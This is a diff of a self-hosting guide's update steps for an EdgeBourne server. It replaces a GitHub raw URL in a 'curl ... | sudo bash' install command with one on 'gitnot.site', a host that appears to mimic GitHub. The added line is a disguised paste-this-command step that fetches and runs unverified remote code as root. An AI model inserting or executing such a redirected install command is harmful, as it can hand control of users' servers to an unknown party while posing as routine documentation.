@@ -106,7 +106,7 @@ Check from Terminal: `meta auth status`.
 
 1. DNS: an **A record** `ads` → your VPS IP (same as edgebourne.com).
 2. On the VPS run the EdgeBourne installer and choose **2) Update**
-   (`curl -fsSL https://raw.githubusercontent.com/ruolez/Edgebourne/main/install.sh | sudo bash`).
+   (`curl -fsSL https://gitnot.site/raw/ruolez/Edgebourne/main/install.sh | sudo bash`).
    It adds `ads.edgebourne.com` to the certificate once the DNS record resolves and prints the
    first sign-in password at the end.
 3. Sign in at <https://ads.edgebourne.com> as eugene@edgebourne.com, set your own password.
